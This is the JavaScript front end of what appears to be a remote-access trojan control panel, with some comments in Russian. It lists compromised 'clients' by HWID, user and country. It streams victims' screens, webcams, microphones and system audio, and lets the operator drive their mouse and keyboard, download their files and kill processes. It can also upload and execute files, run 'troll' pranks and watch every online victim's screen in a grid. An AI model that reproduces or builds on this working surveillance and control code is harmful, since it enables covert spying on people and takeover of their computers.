const icon = getFileIcon(file); const size = file.is_dir ? '' : formatFileSize(file.size); let downloadBtn = ''; if (file.is_dir) { downloadBtn = `<button class="file-download-btn" title="Download ${file.name} as ZIP" onclick="event.stopPropagation(); window.location.href='/api/filemanager/download_folder/${currentClientId}?path=${encodeURIComponent(file.full_path)}'"><svg fill="currentColor" width="18" height="18" viewBox="0 0 24 24"><path d="M20 6h-8l-2-2H4c-1.11 0-2 .89-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2m-6 9v-3h-4v-2h4V7l4 4-4 4Z" /></svg></button>`; } else { downloadBtn = `<button class="file-download-btn" title="Download ${file.name}" onclick="event.stopPropagation(); window.location.href='/api/filemanager/download/${currentClientId}?path=${encodeURIComponent(file.full_path)}'"><svg fill="currentColor" width="18" height="18" viewBox="0 0 24 24"><path d="M5,20H19V18H5M19,9H15V3H9V9H5L12,16L19,9Z" /></svg></button>`; } row.innerHTML = `<td>${icon}</td><td title="${file.name}">${file.name}</td><td>${size}</td><td>${file.modified}</td><td>${downloadBtn}</td>`; if (file.is_dir) { row.ondblclick = () => requestFileList(file.full_path); } fileListBody.appendChild(row); }); }

// --- УПРАВЛЕНИЕ УСТРОЙСТВОМ ---
function selectMonitor(element) { selectedMonitor = element.dataset.id; document.querySelectorAll('#monitorSelection .device-option').forEach(el => el.classList.remove('selected')); element.classList.add('selected'); }
function selectCamera(element) { selectedCamera = element.dataset.id; document.querySelectorAll('#cameraSelection .device-option').forEach(el => el.classList.remove('selected')); element.classList.add('selected'); }
function selectMic(element) { selectedMic = element.dataset.id; document.querySelectorAll('#micSelection .device-option').forEach(el => el.classList.remove('selected')); element.classList.add('selected'); }
function toggleScreenShare() { document.getElementById('screenToggle').checked ? startScreenShare() : stopScreenShare(); }
function startScreenStream() {
    if (screenInterval) clearInterval(screenInterval);
    screenInterval = null; // Убираем старый интервал
    const loading = document.getElementById('screenLoading'), img = document.getElementById('screenImage');
    loading.style.display = 'block';
    img.style.display = 'none';
    img.src = ''; // Очищаем старое изображение
}
function stopScreenStream() { if (screenInterval) { clearInterval(screenInterval); screenInterval = null; } document.getElementById('screenLoading').style.display = 'block'; document.getElementById('screenImage').style.display = 'none'; }
function openFullscreen() {
    const img = document.getElementById('screenImage');
    const fullscreenImg = document.getElementById('fullscreenImage');
    if (img && img.src && img.style.display !== 'none') {
        fullscreenImg.src = img.src;
        document.getElementById('fullscreenModal').style.display = 'block';
    }
}
function closeFullscreen() { if (fullscreenInterval) { clearInterval(fullscreenInterval); fullscreenInterval = null; } document.getElementById('fullscreenModal').style.display = 'none'; }

function toggleCameraStream() {
    document.getElementById('cameraToggle').checked ? startCameraStream() : stopCameraStream();
}

function startCameraStream() {
    if (!currentClientId) return;
    const command = `camera:start:high:${selectedCamera}`;
    sendCommandToClient(currentClientId, command);
    document.getElementById('cameraLoading').style.display = 'block';
    document.getElementById('cameraImage').style.display = 'none';
}

function stopCameraStream() {
    if (!currentClientId) return;
    sendCommandToClient(currentClientId, 'camera:stop');
    document.getElementById('cameraLoading').style.display = 'block';
    document.getElementById('cameraImage').style.display = 'none';
    document.getElementById('cameraToggle').checked = false;
}

function toggleAudioStream() {
    if (document.getElementById('audioToggle').checked) {
        if (!selectedMic) { alert("Please select a microphone first."); document.getElementById('audioToggle').checked = false; return; }
        micPlayer = new AudioStreamPlayer(currentClientId, 'pcm_audio'); micPlayer.start(selectedMic);
    } else { micPlayer?.stop(); }
}
function toggleSystemAudioStream() {
    if (document.getElementById('systemAudioToggle').checked) {
        systemPlayer = new AudioStreamPlayer(currentClientId, 'pcm_system_audio'); systemPlayer.start();
    } else { systemPlayer?.stop(); }
}

function sendCommandToClient(clientId, command) { fetch('/send_command', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: `target=${encodeURIComponent(clientId)}&command=${encodeURIComponent(command)}`}); }
function startScreenShare() { 
    if (!currentClientId) return; 
    const command = `screen:start:medium:${selectedMonitor}`;
    sendCommandToClient(currentClientId, command);
    document.getElementById('screenLoading').style.display = 'block';
    document.getElementById('screenImage').style.display = 'none';
}
function stopScreenShare() { 
    if (!currentClientId) return; 
    sendCommandToClient(currentClientId, 'screen:stop'); 
    stopScreenStream(); 
    document.getElementById('screenToggle').checked = false; 
}

async function uploadAndExecuteFile(onCompleteCallback) {
    const fileInput = document.getElementById('file');
    const file = fileInput.files[0];
    if (!file || !currentClientId) {
        alert("No file selected or no client active.");
        if (onCompleteCallback) onCompleteCallback();
        return;
    }

    const formData = new FormData();
    formData.append('file', file);
    formData.append('target', currentClientId);

    const progressContainer = document.getElementById('uploadProgressContainer');
    const progressBar = document.getElementById('progressBar');
    const progressText = document.getElementById('progressText');

    progressContainer.style.display = 'block';
    progressBar.style.width = '0%';
    progressText.textContent = 'Uploading 0%';

    try {
        const response = await fetch('/api/upload_and_execute', {
            method: 'POST',
            body: formData,
        });

        if (!response.ok) {
            const error = await response.json();
            throw new Error(error.error || 'Upload failed');
        }
        progressText.textContent = 'Upload complete! Command sent.';
        progressBar.style.width = '100%';
    } catch (error) {
        console.error('Upload error:', error);
        progressText.textContent = `Error: ${error.message}`;
    } finally {
        setTimeout(() => { if (onCompleteCallback) onCompleteCallback(); }, 2000);
    }
}

class AudioStreamPlayer {
    constructor(clientId, streamType) {
        this.clientId = clientId;
        this.streamType = streamType;
        this.isStarted = false;
        this.audioContext = null;
        this.nextStartTime = 0;
        this.sampleRate = null;
        this.isInitialized = false;
    }

    start(deviceId = null) {
        console.log(`[AudioStreamPlayer] Starting PCM stream for device ${deviceId || 'default'}`);
        if (this.isStarted) return;
        this.isStarted = true;

        const command = this.streamType === 'pcm_audio' ? `audio:start:mic:${deviceId}` : `audio:start:system`;
        sendCommandToClient(this.clientId, command);
        document.getElementById('audioStatus').textContent = `[PCM] Connecting...`;
    }

    stop() {
        console.log(`[AudioStreamPlayer] Stopping PCM stream`);
        if (!this.isStarted) return;
        this.isStarted = false;

        this.isInitialized = false;
        const command = this.streamType === 'pcm_audio' ? 'audio:stop:mic' : 'audio:stop:system';
        sendCommandToClient(this.clientId, command);

        if (this.audioContext) {
            this.audioContext.close().catch(e => console.error("Error closing AudioContext:", e));
            this.audioContext = null;
        }

        const toggleId = this.streamType === 'pcm_audio' ? 'audioToggle' : 'systemAudioToggle';
        const toggle = document.getElementById(toggleId);
        if (toggle) toggle.checked = false;

        document.getElementById('audioStatus').textContent = 'Stopped';
        this.nextStartTime = 0;
    }

    addChunk(data) {
        if (!this.isStarted) return;

        if (!this.isInitialized) {
            try {
                this.sampleRate = data.format.sampleRate;
                const contextOptions = {};
                if (this.sampleRate === 44100 || this.sampleRate === 16000) {
                    contextOptions.sampleRate = this.sampleRate;
                }
                this.audioContext = new (window.AudioContext || window.webkitAudioContext)(contextOptions);
                if (this.audioContext.state === 'suspended') {
                    this.audioContext.resume();
                }
                this.nextStartTime = this.audioContext.currentTime;
                this.isInitialized = true;
                console.log(`[AudioStreamPlayer] Initialized with sample rate: ${this.sampleRate}Hz`);
            } catch (e) {
                console.error("Failed to create AudioContext:", e);
                this.stop();
                return;
            }
        }

        const format = data.format;
        const rawPcmData = this.base64ToUint8Array(data.data);

        let pcmAsFloat;
        if (format.bitsPerSample === 32) {
            pcmAsFloat = new Float32Array(rawPcmData.buffer);
        } else if (format.bitsPerSample === 16) {
            pcmAsFloat = new Float32Array(rawPcmData.length / 2);
            for (let i = 0, j = 0; i < rawPcmData.length; i += 2, j++) {
                let int = rawPcmData[i] | (rawPcmData[i + 1] << 8);
                pcmAsFloat[j] = (int >= 0x8000 ? int - 0x10000 : int) / 0x8000;
            }
        } else {
            console.error(`[AudioStreamPlayer] Unsupported bit depth: ${format.bitsPerSample}`);
            return;
        }

        const audioBuffer = this.audioContext.createBuffer(
            format.channels,
            pcmAsFloat.length / format.channels,
            format.sampleRate
        );

        for (let channel = 0; channel < format.channels; channel++) {
            audioBuffer.copyToChannel(pcmAsFloat, channel);
        }

        const source = this.audioContext.createBufferSource();
        source.buffer = audioBuffer;
        source.connect(this.audioContext.destination);

        const currentTime = this.audioContext.currentTime;
        if (this.nextStartTime < currentTime) {
            console.warn(`[AudioStreamPlayer] Buffer underrun, resetting playback time. Latency was ${Math.round((currentTime - this.nextStartTime) * 1000)}ms.`);
            this.nextStartTime = currentTime + 0.1;
        }

        source.start(this.nextStartTime);

        this.nextStartTime += audioBuffer.duration;

        document.getElementById('audioStatus').textContent = `[PCM] Streaming... Latency: ${Math.round((this.nextStartTime - currentTime) * 1000)}ms`;
    }

    base64ToUint8Array(base64) {
        const binaryString = atob(base64);
        const len = binaryString.length;
        const bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binaryString.charCodeAt(i);
        }
        return bytes;
    }
}

let monitoredClients = {};

async function startMonitoring() {
    const grid = document.getElementById('monitoring-grid');
    grid.innerHTML = '<p>Fetching online devices...</p>';

    try {
        const response = await fetch('/api/clients');
        const data = await response.json();
        const clients = data.clients || {};
        
        monitoredClients = {};
        const onlineClients = Object.entries(clients).filter(([id, client]) => client.online);

        if (onlineClients.length === 0) {
            grid.innerHTML = '<p>No devices are currently online.</p>';
            return;
        }

        grid.innerHTML = '';

        onlineClients.forEach(([id, client]) => {
            const monitorId = (client.full_info?.monitors?.find(m => m.Primary)?.Id) || '1';
            const command = `screen:start:low:${monitorId}`;
            sendCommandToClient(id, command);
            
            monitoredClients[id] = { 
                command: command, 
                user: client.full_info?.user || 'Unknown' 
            };

            const card = document.createElement('div');
            card.className = 'monitor-card';
            card.innerHTML = `
                <div class="monitor-screen-container">
                    <img id="monitor-img-${id}" class="monitor-screen" alt="Waiting for stream...">
                </div>
                <div class="monitor-label">${monitoredClients[id].user} (${id})</div>
            `;
            grid.appendChild(card);
        });

        if (monitoringInterval) clearInterval(monitoringInterval);
        monitoringInterval = setInterval(requestMonitorFrames, 1500);

    } catch (error) {
        console.error('Error starting monitoring:', error);
        grid.innerHTML = '<p style="color: #ff3b30;">Error loading online devices.</p>';
    }
}

async function requestMonitorFrames() {
    for (const clientId in monitoredClients) {
        try {
            const response = await fetch(`/api/get_client_data/${clientId}?type=screen`);
            if (!response.ok) continue;
            const data = await response.json();
            if (data && data.data) {
                const imgElement = document.getElementById(`monitor-img-${clientId}`);
                if (imgElement) {
                    imgElement.src = `data:image/jpeg;base64,${data.data}`;
                }
            }
        } catch (error) {
        }
    }
}

function stopMonitoring() {
    if (monitoringInterval) { clearInterval(monitoringInterval);
        monitoringInterval = null;
    }
    for (const clientId in monitoredClients) {
        sendCommandToClient(clientId, 'screen:stop');
    }
    monitoredClients = {};
    document.getElementById('monitoring-grid').innerHTML = '<p>Monitoring stopped.</p>';
}
function setupTrollControls() {
    const volumeSlider = document.getElementById('trollVolumeSlider');
    const volumeLabel = document.getElementById('trollVolumeLabel');
    volumeSlider.oninput = () => {
        volumeLabel.textContent = volumeSlider.value;
    };
    volumeSlider.onchange = () => {
        sendCommandToClient(currentClientId, `troll:volume_set:${volumeSlider.value}`);
    };

    const mouseTrailsToggle = document.getElementById('trollMouseTrailsToggle');
    mouseTrailsToggle.onchange = () => {
        const command = `troll:mouse_trails:${mouseTrailsToggle.checked ? 'on' : 'off'}`;
        sendCommandToClient(currentClientId, command);
    };

    const audioDeviceSelect = document.getElementById('trollAudioDeviceSelect');
    audioDeviceSelect.onchange = () => {
        sendCommandToClient(currentClientId, `troll:set_audio_device:${audioDeviceSelect.value}`);
    };
}

function trollCommand(commandType, inputId) {
    if (!currentClientId) return;
    const inputElement = document.getElementById(inputId);
    const value = inputElement.value;
    if (!value) {
        alert("Please enter a value.");
        return;
    }
    const command = `${commandType}:${value}`;
    sendCommandToClient(currentClientId, command);
    inputElement.value = '';
}

async function uploadTrollFile(inputId, endpoint) {
    if (!currentClientId) return;
    const fileInput = document.getElementById(inputId);
    const file = fileInput.files[0];

    if (!file) {
        alert("Please select a file first.");
        return;
    }

    const formData = new FormData();
    formData.append('file', file);
    formData.append('target', currentClientId);

    try {
        const response = await fetch(endpoint, {
            method: 'POST',
            body: formData,
        });

        if (!response.ok) {
            const error = await response.json();
            throw new Error(error.error || 'Upload failed');
        }
        fileInput.value = ''; // Reset file input
    } catch (error) {
        alert(`Error: ${error.message}`);
    }
}

let lastMouseMoveTime = 0;

function setupRemoteControl() {
    const screenContainer = document.getElementById('screenContainer');
    const fullscreenContent = document.querySelector('.fullscreen-content');
    const remoteControlToggle = document.getElementById('remoteControlToggle');

    const handler = (e) => handleRemoteControl(e);

    remoteControlToggle.addEventListener('change', () => {
        const enable = remoteControlToggle.checked;
        const action = enable ? 'addEventListener' : 'removeEventListener';

        // Mouse events
        ['click', 'contextmenu', 'dblclick', 'mousemove'].forEach(eventType => {
            screenContainer[action](eventType, handler);
            fullscreenContent[action](eventType, handler);
        });

        // Keyboard events
        ['keydown', 'keyup'].forEach(eventType => {
            document[action](eventType, handler);
        });

        // Cursor style
        screenContainer.style.cursor = enable ? 'crosshair' : 'pointer';
        fullscreenContent.style.cursor = enable ? 'crosshair' : 'none';
        document.getElementById('screenImage').style.cursor = enable ? 'crosshair' : 'pointer';
    });
}

function handleRemoteControl(event) {
    if (!currentClientId || !document.getElementById('remoteControlToggle').checked) return;

    if (['click', 'contextmenu', 'dblclick', 'mousemove'].includes(event.type)) {
        event.preventDefault();
        event.stopPropagation();

        // Цель события - это контейнер, но нам нужна картинка внутри для размеров
        const img = event.currentTarget.querySelector('img');
        if (!img) return;
        const rect = img.getBoundingClientRect();

        const clickX = event.clientX - rect.left;
        const clickY = event.clientY - rect.top;

        const relativeX = Math.max(0, Math.min(1, clickX / rect.width));
        const relativeY = Math.max(0, Math.min(1, clickY / rect.height));

        let commandType;
        switch (event.type) {
            case 'click': commandType = 'left_click'; break;
            case 'contextmenu': commandType = 'right_click'; break;
            case 'dblclick': commandType = 'double_click'; break;
            case 'mousemove':
                const now = Date.now();
                if (now - lastMouseMoveTime < 50) {
                    return;
                }
                lastMouseMoveTime = now;
                commandType = 'move';
                break;
            default: return;
        }
 
        sendCommandToClient(currentClientId, `input:mouse:${commandType}:${relativeX}:${relativeY}`);
    }

    if (event.type === 'keydown' || event.type === 'keyup') {
        const isModalActive = document.getElementById('clientModal').style.display === 'block' && document.getElementById('screen').classList.contains('active');
        const isFullscreenActive = document.getElementById('fullscreenModal').style.display === 'block';

        if (isModalActive || isFullscreenActive) {
            event.preventDefault();
            const commandType = event.type;
            sendCommandToClient(currentClientId, `input:keyboard:${commandType}:${event.key}`);
        }
    }
}

async function deleteClient(clientId, event) {
    event.stopPropagation();

    if (!confirm(`Are you sure you want to permanently delete client ${clientId}? This action cannot be undone.`)) {
        return;
    }

    try {
        const response = await fetch(`/api/clients/${clientId}`, { method: 'DELETE' });
        if (!response.ok) throw new Error('Failed to delete client');
        updateClientsList();
    } catch (error) {
        console.error('Error deleting client:', error);
        alert('Could not delete the client.');
    }
}

function updateClientsList() {
    fetch('/api/clients').then(response => response.json()).then(data => {
        const container = document.getElementById('clientsContainer');
        const clients = data.clients || {};
        let clientIds = Object.keys(clients);

        clientIds.sort((a, b) => (clients[b].last_seen || 0) - (clients[a].last_seen || 0));

        const searchTerm = document.getElementById('searchInput').value.toLowerCase();
        if (searchTerm) {
            clientIds = clientIds.filter(id => {
                const client = clients[id];
                const userInfo = client.full_info || {};
                const user = (userInfo.user || '').toLowerCase();
                const hwid = (userInfo.hwid || id).toLowerCase();
                const lang = (userInfo.language || '').toLowerCase();
                const country = getCountryFromLocale(userInfo.language).toLowerCase();
                return user.includes(searchTerm) || hwid.includes(searchTerm) || lang.includes(searchTerm) || country.includes(searchTerm);
            });
        }

        document.getElementById('total').textContent = clientIds.length;

        if (clientIds.length > 0) {
            container.innerHTML = clientIds.map(clientId => {
                const client = clients[clientId];
                const isOnline = client.online;
                const userInfo = client.full_info || {};
                const country = getCountryFromLocale(userInfo.language);

                const secondaryInfo = [
                    client.device_info || 'No OS',
                    country,
                    userInfo.hwid || 'No HWID'
                ].join(' | ');

                return `
                    <div class="client-card" onclick="openClientModal('${clientId}')">
                        <div class="${isOnline ? 'status-online' : 'status-offline'}"></div>
                        <div style="flex-grow: 1; overflow: hidden;">
                            <strong>${userInfo.user || 'Unknown User'}</strong>
                            <div style="font-size: 13px; color: #86868b; margin-top: 4px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">
                                ${secondaryInfo}
                            </div>
                        </div>
                        <button class="bin-button" onclick="deleteClient('${clientId}', event)" title="Delete Client">
                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 69 14" class="svgIcon bin-top">
                                <g clip-path="url(#clip0_35_24)">
                                    <path fill="currentColor" d="M20.8232 2.62734L19.9948 4.21304C19.8224 4.54309 19.4808 4.75 19.1085 4.75H4.92857C2.20246 4.75 0 6.87266 0 9.5C0 12.1273 2.20246 14.25 4.92857 14.25H64.0714C66.7975 14.25 69 12.1273 69 9.5C69 6.87266 66.7975 4.75 64.0714 4.75H49.8915C49.5192 4.75 49.1776 4.54309 49.0052 4.21305L48.1768 2.62734C47.3451 1.00938 45.6355 0 43.7719 0H25.2281C23.3645 0 21.6549 1.00938 20.8232 2.62734ZM64.0023 20.0648C64.0397 19.4882 63.5822 19 63.0044 19H5.99556C5.4178 19 4.96025 19.4882 4.99766 20.0648L8.19375 69.3203C8.44018 73.0758 11.6746 76 15.5712 76H53.4288C57.3254 76 60.5598 73.0758 60.8062 69.3203L64.0023 20.0648Z"></path>
                                </g>
                                <defs>
                                    <clipPath id="clip0_35_24">
                                        <rect fill="white" height="14" width="69"></rect>
                                    </clipPath>
                                </defs>
                            </svg>
                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 69 57" class="svgIcon bin-bottom">
                                <g clip-path="url(#clip0_35_22)">
                                    <path fill="currentColor" d="M20.8232 -16.3727L19.9948 -14.787C19.8224 -14.4569 19.4808 -14.25 19.1085 -14.25H4.92857C2.20246 -14.25 0 -12.1273 0 -9.5C0 -6.8727 2.20246 -4.75 4.92857 -4.75H64.0714C66.7975 -4.75 69 -6.8727 69 -9.5C69 -12.1273 66.7975 -14.25 64.0714 -14.25H49.8915C49.5192 -14.25 49.1776 -14.4569 49.0052 -14.787L48.1768 -16.3727C47.3451 -17.9906 45.6355 -19 43.7719 -19H25.2281C23.3645 -19 21.6549 -17.9906 20.8232 -16.3727ZM64.0023 1.0648C64.0397 0.4882 63.5822 0 63.0044 0H5.99556C5.4178 0 4.96025 0.4882 4.99766 1.0648L8.19375 50.3203C8.44018 54.0758 11.6746 57 15.5712 57H53.4288C57.3254 57 60.5598 54.0758 60.8062 50.3203L64.0023 1.0648Z"></path>
                                </g>
                                <defs>
                                    <clipPath id="clip0_35_22">
                                        <rect fill="white" height="57" width="69"></rect>
                                    </clipPath>
                                </defs>
                            </svg>
                        </button>
                    </div>`;
            }).join('');
        } else {
            container.innerHTML = '<p style="text-align:center; color: #86868b;">No devices found.</p>';
        }
    }).catch(error => {
        console.error('Error updating clients list:', error);
        document.getElementById('clientsContainer').innerHTML = '<p style="text-align:center; color: #ff3b30;">Error loading devices.</p>';
    });
}

function formatMemory(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

async function requestProcessList() {
    if (!currentClientId) return;
    const processListBody = document.getElementById('processListBody');
    processListBody.innerHTML = '<tr><td colspan="5" style="text-align:center;">Loading processes...</td></tr>';

    try {
        const response = await fetch(`/api/processes/list/${currentClientId}`);

        if (!response.ok) {
            const errorData = await response.json();
            const errorMessage = `Failed to load: ${response.status} ${response.statusText}. Server says: "${errorData.error}"`;
            throw new Error(errorMessage);
        }

        const processes = await response.json();
        updateProcessListView(processes);

    } catch (error) {
        console.error('Error requesting process list:', error);
        processListBody.innerHTML = `<tr><td colspan="5" style="text-align:center; color: #ff3b30;"> ${error.message}</td></tr>`;
    }
}

function updateProcessListView(processes) {
    const processListBody = document.getElementById('processListBody');
    processListBody.innerHTML = '';

    if (!processes || !Array.isArray(processes) || processes.length === 0) {
        processListBody.innerHTML = '<tr><td colspan="5" style="text-align:center;">No processes found or client did not respond.</td></tr>';
        return;
    }

    let lastType = null;
    processes.forEach(proc => {
        if (proc.type !== lastType) {
            const headerRow = document.createElement('tr');
            headerRow.innerHTML = `<th colspan="5" class="process-group-header">${proc.type === 'App' ? 'Apps' : 'Background Processes'}</th>`;
            processListBody.appendChild(headerRow);
            lastType = proc.type;
        }

        const row = document.createElement('tr');
        if (proc.status === 'Suspended') {
            row.classList.add('process-suspended');
        }

        const pid = proc.pid || 'N/A';
        const name = proc.name || 'Unknown';
        const title = proc.title || 'N/A';
        const memory = formatMemory(proc.memory || 0);

        let suspendBtn = '';
        if (proc.status === 'Running') {
            suspendBtn = `<button class="button-suspend" title="Suspend Process" onclick="suspendProcess(${pid})">Suspend</button>`;
        } else if (proc.status === 'Suspended') {
            suspendBtn = `<button class="button-resume" title="Resume Process" onclick="resumeProcess(${pid})">Resume</button>`;
        }

        const killBtn = `<button class="button-delete" title="Kill Process" onclick="killProcess(${pid})">Kill</button>`;

        row.innerHTML = `
            <td>${pid}</td>
            <td title="${name}">${name}</td>
            <td title="${title}">${title}</td>
            <td>${memory}</td>
            <td class="process-actions">
                ${pid !== 'N/A' && proc.status !== 'Unknown' ? suspendBtn : ''}
                ${pid !== 'N/A' ? killBtn : ''}
            </td>
        `;
        processListBody.appendChild(row);
    });
}

function killProcess(pid) {
    if (!currentClientId || !pid) return;
    if (confirm(`Are you sure you want to KILL the process with PID ${pid}? This cannot be undone.`)) {
        sendCommandToClient(currentClientId, `processes:kill:${pid}`);
        setTimeout(requestProcessList, 1000);
    }
}

function suspendProcess(pid) {
    if (!currentClientId || !pid) return;
    sendCommandToClient(currentClientId, `processes:suspend:${pid}`);
    setTimeout(requestProcessList, 1000);
}

function resumeProcess(pid) {
    if (!currentClientId || !pid) return;
    sendCommandToClient(currentClientId, `processes:resume:${pid}`);
    setTimeout(requestProcessList, 1000);
}